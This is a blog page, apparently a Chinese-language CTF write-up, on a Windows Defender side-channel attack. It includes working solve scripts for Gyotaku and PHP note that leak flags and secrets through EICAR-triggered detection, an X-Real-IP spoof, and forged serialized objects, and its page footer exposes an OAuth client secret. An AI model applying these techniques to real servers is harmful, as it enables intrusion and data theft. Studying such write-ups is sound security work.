@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2019/05/ethernaut-part-writeup/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2019/09/side-channel-by-windows-defender/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Windows Defender 侧信道攻击 | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="Windows Defender 侧信道攻击 | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "Windows Defender 侧信道攻击",
+    "headline" : "Windows Defender 侧信道攻击",
+    "description" : "前言 利用 Windows Defender 进行侧信道攻击是 TokyoWesterns 在 WCTF 2019 上提出来的一种新的思路，与之相关的是 WCTF 2019 的题目 Gyotaku 和 TWCTF2019 的 PHP note。 ##Windows Defender 根据 icchy 在分享环节 ppt 的总结，Wind",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2019",
+    "datePublished": "2019-09-05 13:25:41 \x2b0800 CST",
+    "dateModified" : "2019-09-05 13:25:41 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2019\/09\/side-channel-by-windows-defender\/",
+    "wordCount" : "2994",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="dark-theme">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Windows Defender 侧信道攻击</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2019-09-05 itemprop="datePublished">September 5, 2019</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<h2 id="前言">前言</h2>
+
+<p>利用 Windows Defender 进行侧信道攻击是 TokyoWesterns 在 WCTF 2019 上提出来的一种新的思路，与之相关的是 WCTF 2019 的题目 Gyotaku 和 TWCTF2019 的 PHP note。</p>
+
+<p>##Windows Defender</p>
+
+<p>根据 icchy 在分享环节 ppt 的总结，Windows Defender 会表现出如下特征：</p>
+
+<blockquote>
+<ul>
+<li>As we investigated:
+
+<ol>
+<li>check the content of the file whether malicious data included</li>
+<li>change permission to prevent user from accessing</li>
+<li>Replace malicious part with null bytes</li>
+<li>(delete entire file)</li>
+</ol></li>
+<li>In step 2:
+
+<ul>
+<li>the file obtained by SYSTEM</li>
+<li><strong>user cannot open the file</strong></li>
+</ul></li>
+</ul>
+</blockquote>
+
+<p>而只要找到一种合适的方式，我们可以在某种程度上滥用 Windows Defender 的这种特性，进而进行侧信道攻击。</p>
+
+<h3 id="如何触发-windows-defender">如何触发 Windows Defender</h3>
+
+<p>很简单，利用 EICAR 测试文件即可，关于什么是 EICAR 测试文件，以下是官方简介：</p>
+
+<blockquote>
+<p>欧洲计算机防病毒研究所 (EICAR) 开发了一种测试病毒，可用于测试您的防病毒设备。此脚本是一个惰性文本文件。二进制特征码包含在多数防病毒产品供应商的病毒码文件中。它本质上不是病毒，并且不包含任何程序代码。</p>
+</blockquote>
+
+<p>将下面内容写入一个 eicar.com 文件，然后尝试访问：</p>
+
+<pre><code>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+</code></pre>
+
+<p>尝试读取该文件，可以发现触发了 Windows Defender 的拦截：</p>
+
+<pre><code class="language-powershell">PS C:\Users\syang\Desktop&gt; type .\eicar.com
+type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。
+所在位置 行:1 字符: 1
++ type .\eicar.com
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ReadError: (C:\Users\syang\Desktop\eicar.com:String) [Get-Content], IOException
+    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand%
+</code></pre>
+
+<h3 id="jscript-engine-in-mpengine-dll">JScript engine in mpengine.dll</h3>
+
+<p>作为 Windows Defender 最核心的动态链接库，mpengine.dll 实现了对多种文件的检测功能，其中就包括了一个 JS 引擎，该引擎对 JS 相关的内容进行分析，比如 eval 的参数，这里的 JS 脚本包括 HTML 中的 <code>&lt;script&gt;</code> 标签中的内容。这里贴一份 <a href="https://n0b0dycn.me/" rel="nofollow noreferrer" target="_blank">n0b0dy</a> 师傅测试成功的 payload，可以看到尝试访问时会触发 Windows Defender：</p>
+
+<pre><code class="language-html">&lt;script&gt;
+var body = document.body.innerHTML;
+var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;;
+eval(mal);
+&lt;/script&gt;
+&lt;body&gt;&lt;/body&gt;
+</code></pre>
+
+<pre><code class="language-powershell">PS C:\Users\syang\Desktop&gt; type .\test.html
+type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。
+所在位置 行:1 字符: 1
++ type .\test.html
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ReadError: (C:\Users\syang\Desktop\test.html:String) [Get-Content], IOException
+    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
+</code></pre>
+
+<p>但这里有个值得困惑的点是本人使用了类似的 payload 却不会触发 Windows Defender 的预警：</p>
+
+<pre><code class="language-html">&lt;script&gt;
+eval(&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);
+&lt;/script&gt;
+&lt;body&gt;&lt;/body&gt;
+</code></pre>
+
+<p>看到 n0b0dy 师傅也提了一句：</p>
+
+<blockquote>
+<p>但是如果不加第二行<code>var body = document.body.innerHTML;</code>的话，则无法触发Windows Defender。</p>
+</blockquote>
+
+<p>大概只能归因于 Windows Defender 的奇怪特性。另外根据分享的 ppt，可以发现该引擎还有如下几个特性：</p>
+
+<blockquote>
+<ul>
+<li>if statement will never be evaluated
+
+<ul>
+<li>if (true) {eval(&ldquo;EICA&rdquo; + &ldquo;R&rdquo;)} -&gt; not detected</li>
+<li><strong>object accessing</strong> will help you: {0: &ldquo;a&rdquo;, 1: &ldquo;b&rdquo;, …}[input]</li>
+</ul></li>
+<li>parser stops on null byte
+
+<ul>
+<li>eval(&ldquo;EICA&rdquo; + &ldquo;[NULL]&ldquo;) -&gt; syntax error</li>
+<li>parser will not stop no null byte (in HTML document)</li>
+</ul></li>
+</ul>
+</blockquote>
+
+<p>所以，利用以上特性和 JavaScript 能访问页面元素的特性，可以进行侧信道攻击，比如以下代码会触发 Windows Defender 的预警：</p>
+
+<pre><code class="language-html">&lt;script&gt;
+var body = document.body.innerHTML;
+var n = body[0];
+var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&quot;+n;
+eval(mal);
+&lt;/script&gt;
+&lt;body&gt;*&lt;/body&gt;
+</code></pre>
+
+<p>而以下内容不会：</p>
+
+<pre><code class="language-html">&lt;script&gt;
+var body = document.body.innerHTML;
+var n = body[0];
+var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&quot;+n;
+eval(mal);
+&lt;/script&gt;
+&lt;body&gt;a&lt;/body&gt;
+</code></pre>
+
+<p>由此，赞美 TokyoWesterns，一个全新的侧信道思路出现了！</p>
+
+<h2 id="gyotaku">Gyotaku</h2>
+
+<p>题目 repo：<a href="https://github.com/icchy/wctf2019-gtf" rel="nofollow noreferrer" target="_blank">WCTF2019: Gyotaku The Flag</a></p>
+
+<h3 id="非预期">非预期</h3>
+
+<p>题目本身是基于 echo 框架的，阅读题目源码，可以发现在 <code>main.go</code> 中直接定义了获得了 flag 的接口： <code>e.GET(&quot;/flag&quot;, FlagHandler, InternalRequiredMiddleware)</code> ，所以只要满足 <code>InternalRequiredMiddleware</code> 的验证，即可获得 flag。</p>
+
+<p>阅读相应源码，可以发现需要满足访问 ip 为 127.0.0.1 这个条件即可通过验证：</p>
+
+<pre><code class="language-go">func InternalRequiredMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		ip := net.ParseIP(c.RealIP())
+		localip := net.ParseIP(&quot;127.0.0.1&quot;)
+		if !ip.Equal(localip) {
+			return echo.NewHTTPError(http.StatusForbidden)
+		}
+		return next(c)
+	}
+
+</code></pre>
+
+<p>而根据 echo 对 <code>RealIP</code>  的实现，这里可以使用 <code>X-Real-IP: 127.0.0.l</code> 欺骗进而绕过：</p>
+
+<pre><code class="language-go">func (c *context) RealIP() string {
+	if ip := c.request.Header.Get(HeaderXForwardedFor); ip != &quot;&quot; {
+		return strings.Split(ip, &quot;, &quot;)[0]
+	}
+	if ip := c.request.Header.Get(HeaderXRealIP); ip != &quot;&quot; {
+		return ip
+	}
+	ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)
+	return ra
+}
+</code></pre>
+
+<p>充分说明了出题后验题的重要性（）</p>
+
+<h2 id="预期解">预期解</h2>
+
+<p>理论上的预期解，无需访问 <code>/flag</code> ，而是使用 Windows Defender 的特性进行侧信道，进而泄露出 flag。</p>
+
+<p>首先回到题目本身，来看到除了直接访问 <code>/flag</code> 路径外，是否存在着第二种方式可以获得 flag。很容易就注意到 <code>e.POST(&quot;/gyotaku&quot;, GyotakuHandler(dbconn), LoginRequiredMiddleware)</code>，继续跟进 <code>GyotakuHandler</code> 函数，可以发现该函数会根据传入的参数 <code>url</code> 进行请求相应资源，然后保存到本地。</p>
+
+<pre><code class="language-go">func GyotakuHandler(db *DBConn) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		sess, _ := session.Get(SessionName, c)
+		username := sess.Values[&quot;username&quot;].(string)
+
+		url := c.FormValue(&quot;url&quot;)
+
+		// generate gyotaku id
+		gid := fmt.Sprintf(&quot;%x&quot;, sha256.Sum256([]byte(url)))
+
+		_, err := os.Stat(path.Join(GyotakuDir, gid))
+		if !os.IsNotExist(err) {
+			return c.JSON(http.StatusConflict, &quot;this gyotaku has already been taken&quot;)
+		}
+
+		resp, err := http.Get(url)
+		if err != nil {
+			return err
+		}
+		defer resp.Body.Close()
+
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return err
+		}
+
+		// save gyotaku
+		gyotakudata := &amp;GyotakuData{
+			URL:      url,
+			Data:     string(body),
+			UserName: username,
+		}
+
+		buf := bytes.NewBuffer(nil)
+		err = gob.NewEncoder(buf).Encode(gyotakudata)
+		if err != nil {
+			return err
+		}
+		err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644)
+		if err != nil {
+			return err
+		}
+
+		err = db.AddGyotakuList(username, gid)
+		if err != nil {
+			return err
+		}
+
+		return c.JSON(http.StatusOK, gid)
+	}
+}
+</code></pre>
+
+<p>但跟进 <code>GyotakuViewHandler</code> 可以看到题目本身没有实现查看的功能，所以无法查看保存到本地的文件内容：</p>
+
+<pre><code class="language-go">func GyotakuViewHandler(db *DBConn) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		// sess, _ := session.Get(SessionName, c)
+		// username := sess.Values[&quot;username&quot;].(string)
+		gid := c.Param(&quot;gid&quot;)
+
+		_, err := os.Stat(path.Join(GyotakuDir, gid))
+		if os.IsNotExist(err) {
+			return c.JSON(http.StatusNotFound, &quot;no such gyotaku&quot;)
+		}
+
+		_, err = ioutil.ReadFile(path.Join(GyotakuDir, gid))
+		if err != nil {
+			return err
+		}
+
+		return c.JSON(http.StatusNotImplemented, &quot;sorry but I couldn't make it by the submission deadline :P&quot;)
+
+		// var gyotakudata GyotakuData
+		// buf := bytes.NewBuffer(data)
+		// err = gob.NewDecoder(buf).Decode(&amp;gyotakudata)
+		// if err != nil {
+		// 	return err
+		// }
+
+		// if username != gyotakudata.UserName {
+		// 	return c.JSON(http.StatusForbidden, &quot;this is not your gyotaku&quot;)
+		// }
+	}
+}
+</code></pre>
+
+<p>至此，可以总结出以下几个要点：</p>
+
+<ol>
+<li>由于是 SSRF，所以能直接请求到 <code>/flag</code> 的内容</li>
+<li>请求到的内容会保存到本地，保存的结构为 <code>GyotakuData{URL: url, Data: string(body), UserName: username}</code></li>
+<li>保存到本地的内容会被读取，但无法回显给用户</li>
+</ol>
+
+<p>综合一下我们的思路，这意味着我们可能需要一种侧信道的方式来猜解 flag。</p>
+
+<p>回顾一下可以控制的变量，<code>url</code> 和 <code>username</code>，如果只要我们构造出 <code>url=/flag?a=&lt;scirpt&gt;code&lt;/script&gt;&lt;body&gt;</code>，<code>username=&lt;/body&gt;</code>，就可以构造出一个包含 flag 的文件，而该文件在被读取时可以触发 可以被 Windows Defender 的预警，利用一定的 JavaScript 代码，我们可以对 flag 进行猜解。</p>
+
+<blockquote>
+<ul>
+<li>JavaScript
+
+<ul>
+<li><code>$idx</code> and <code>$c</code> would be iterated</li>
+</ul></li>
+</ul>
+
+<pre><code class="language-javascript">&gt; var body = document.body.innerHTML;
+&gt; var mal = &quot;EICA&quot;;
+&gt; var n = body[$idx].charCodeAt(0);
+&gt; mal = mal + String.fromCharCode(n^$c);
+&gt; eval($c)
+&gt; ```
+&gt;
+&gt; - Windows Defender get angry if `$c` is appropriate
+
+### solve
+
+这里是出题人给的 solve.py，利用二分搜索加快了猜解的进度：
+
+```python
+import requests
+
+URL = &quot;http://192.168.122.78&quot; # changeme
+
+def randstr(n=8):
+    import random
+    import string
+    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
+    return ''.join([random.choice(chars) for _ in range(n)])
+
+def trigger(c, idx, sess):
+    import string
+    prefix = randstr()
+    p = prefix + '''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''
+    p = string.Template(p).substitute({'idx': idx, 'c': c})
+    req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p})
+    return req.json()
+
+def leak(idx, sess):
+    l, h = 0, 0x100
+    while h - l &gt; 1:
+        m = (h + l) // 2
+        gid = trigger(m, idx, sess)
+        if sess.get(URL + '/gyotaku/' + gid).status_code == 500:
+            l = m
+        else:
+            h = m
+    return chr(l)
+
+sess = requests.session()
+sess.post(URL + '/login', data={'username': '&lt;/body&gt;'+randstr(), 'password': randstr()})
+
+data = ''
+for i in range(30):
+    data += leak(i, sess)
+    print(data)
+
+</code></pre>
+</blockquote>
+
+<h2 id="php-note">PHP note</h2>
+
+<p>题目直接给出了源码：</p>
+
+<pre><code class="language-php+HTML">&lt;?php
+include 'config.php';
+
+class Note {
+    public function __construct($admin) {
+        $this-&gt;notes = array();
+        $this-&gt;isadmin = $admin;
+    }
+
+    public function addnote($title, $body) {
+        array_push($this-&gt;notes, [$title, $body]);
+    }
+
+    public function getnotes() {
+        return $this-&gt;notes;
+    }
+
+    public function getflag() {
+        if ($this-&gt;isadmin === true) {
+            echo FLAG;
+        }
+    }
+}
+
+function verify($data, $hmac) {
+    $secret = $_SESSION['secret'];
+    if (empty($secret)) return false;
+    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
+}
+
+function hmac($data) {
+    $secret = $_SESSION['secret'];
+    if (empty($data) || empty($secret)) return false;
+    return hash_hmac('sha256', $data, $secret);
+}
+
+function gen_secret($seed) {
+    return md5(SALT . $seed . PEPPER);
+}
+
+function is_login() {
+    return !empty($_SESSION['secret']);
+}
+
+function redirect($action) {
+    header(&quot;Location: /?action=$action&quot;);
+    exit();
+}
+
+$method = $_SERVER['REQUEST_METHOD'];
+$action = $_GET['action'];
+
+if (!in_array($action, ['index', 'login', 'logout', 'post', 'source', 'getflag'])) {
+    redirect('index');
+}
+
+if ($action === 'source') {
+    highlight_file(__FILE__);
+    exit();
+}
+
+
+session_start();
+
+if (is_login()) {
+    $realname = $_SESSION['realname'];
+    $nickname = $_SESSION['nickname'];
+    
+    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])
+            ? unserialize(base64_decode($_COOKIE['note']))
+            : new Note(false);
+}
+
+if ($action === 'login') {
+    if ($method === 'POST') {
+        $nickname = (string)$_POST['nickname'];
+        $realname = (string)$_POST['realname'];
+
+        if (empty($realname) || strlen($realname) &lt; 8) {
+            die('invalid name');
+        }
+
+        $_SESSION['realname'] = $realname;
+        if (!empty($nickname)) {
+            $_SESSION['nickname'] = $nickname;
+        }
+        $_SESSION['secret'] = gen_secret($nickname);
+    }
+    redirect('index');
+}
+
+if ($action === 'logout') {
+    session_destroy();
+    redirect('index');
+}
+
+if ($action === 'post') {
+    if ($method === 'POST') {
+        $title = (string)$_POST['title'];
+        $body = (string)$_POST['body'];
+        $note-&gt;addnote($title, $body);
+        $data = base64_encode(serialize($note));
+        setcookie('note', (string)$data);
+        setcookie('hmac', (string)hmac($data));
+    }
+    redirect('index');
+}
+
+if ($action === 'getflag') {
+    $note-&gt;getflag();
+}
+
+?&gt;
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;PHP note&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;style&gt;
+        textarea {
+            resize: none;
+            width: 300px;
+            height: 200px;
+        }
+    &lt;/style&gt;
+    &lt;body&gt;
+        &lt;?php
+        if (!is_login()) {
+            $realname = htmlspecialchars($realname);
+            $nickname = htmlspecialchars($nickname);
+        ?&gt;
+        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
+            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;
+            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;?php
+        } else {
+        ?&gt;
+        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;
+        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;
+        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;
+        &lt;br/&gt;
+        &lt;br/&gt;
+        &lt;?php
+            foreach($note-&gt;getnotes() as $k =&gt; $v) {
+                list($title, $body) = $v;
+                $title = htmlspecialchars($title);
+                $body = htmlspecialchars($body);
+        ?&gt;
+        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;
+        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;
+        &lt;?php
+            }
+        ?&gt;
+        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;
+            &lt;br&gt;
+            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;
+            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;?php
+        }
+        ?&gt;
+        &lt;?php
+        ?&gt;
+        &lt;script&gt;
+            document.querySelector(&quot;form#login&quot;).addEventListener('submit', (e) =&gt; {
+                const nickname = document.querySelector(&quot;input#nickname&quot;)
+                const firstname = document.querySelector(&quot;input#firstname&quot;)
+                const lastname = document.querySelector(&quot;input#lastname&quot;)
+                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`
+                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {
+                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()
+                }
+            })
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>可以看到是一个很正常的反序列化的题目，但由于不知道 <code>$_SESSION['secret']</code> 的值，构造后的反序列化对象无法通过 <code>hmac</code> 验证。因此，解题的第一步需要猜解出 <code>$_SESSION['secret']</code>。</p>
+
+<p>查看 HTTP 请求的 header，可以发现相应的 server 是一台 Windows：</p>
+
+<pre><code>Content-Length: 27171
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 05 Sep 2019 14:16:31 GMT
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.3.9
+</code></pre>
+
+<p>那么很自然的考虑利用 Windows Defender 来进行侧信道。考虑到 PHP 的 session 本质上也是存储在 server 上的文件，那么可以利用创建一个恶意 session 文件的方式来触发 Windows Defender。</p>
+
+<p>注意到由于复制顺序的问题，我们需要两次调用 <code>/login</code> 来构造一个符合 HTML 格式的 session 文件，以下是在 Linux 上的模拟，不要在意真题环境是 Windows 这种事情（逃：</p>
+
+<pre><code class="language-shell">$ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
+realname|s:209:&quot;--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{0:'*'}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&quot;;secret|s:32:&quot;8b9a527ff677cb223afa87dad7c9e6f8&quot;;
+$ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
+realname|s:209:&quot;--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{0:'*'}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&quot;;secret|s:32:&quot;121cc233a4700baca86ab6a6fa3f2d50&quot;;nickname|s:8:&quot;1&lt;/body&gt;&quot;;
+</code></pre>
+
+<p>修改脚本：</p>
+
+<pre><code class="language-python">import random
+import string
+import requests
+
+URL = &quot;http://phpnote.chal.ctf.westerns.tokyo/?action={}&quot;
+
+def trigger(c, idx):
+    sess = requests.session()
+    payload = '''&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;'''
+    payload = string.Template(payload).substitute({'idx': idx, 'c': c})
+    sess.post(URL.format('login'), data={
+        'realname': payload 
+    })
+    sess.post(URL.format('login'), data={
+        'nickname': '1&lt;/body&gt;',
+        'realname': payload 
+    })
+    res = sess.get(URL.format('index'))
+    return 'Login' in res.text
+
+def leak(idx):
+    l, h = 0, 0x100
+    while h - l &gt; 1:
+        m = (h + l) // 2
+        if trigger(m, idx):
+            l = m
+        else:
+            h = m
+    return chr(l)
+
+data = ''
+for i in range(60):
+    data += leak(i)
+    print(data)
+
+</code></pre>
+
+<p>泄露出 secret 后构造反序列化对象：</p>
+
+<pre><code class="language-php">$secret = &quot;7daeeed052fd2908fb30f462ad1c7936&quot;;
+$note = new Note(true);
+$note-&gt;addnote(&quot;exploit&quot;,&quot;works&quot;);
+$obj = base64_encode(serialize($note));
+print_r($obj.&quot;\n&quot;);
+print_r(hmac($obj, $secret));
+</code></pre>
+
+<p>获得 flag：<code>TWCTF{h0pefully_I_haven't_made_a_m1stake_again}</code></p>
+
+<h2 id="总结">总结</h2>
+
+<p>很多情况下漏洞不等价于 RCE，而在于我们是否能从不同的维度对一个功能进行探索，以上。</p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<ul>
+<li><p><a href="https://n0b0dycn.me/2019/08/playing-with-windows-defender/" rel="nofollow noreferrer" target="_blank">Playing with Windows Defender</a></p></li>
+
+<li><p><a href="https://github.com/icchy/wctf2019-gtf/blob/master/wctf2019-gtf-slides.pdf" rel="nofollow noreferrer" target="_blank">WCTF2019: Gyotaku The Flag</a></p></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2019/09/side-channel-by-windows-defender/>https://syang-ng.github.io/2019/09/side-channel-by-windows-defender/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2019/05/ethernaut-part-writeup/" class="prev" rel="prev" title="Ethernaut 部分题解"><i class="iconfont icon-left"></i>&nbsp;Ethernaut 部分题解</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
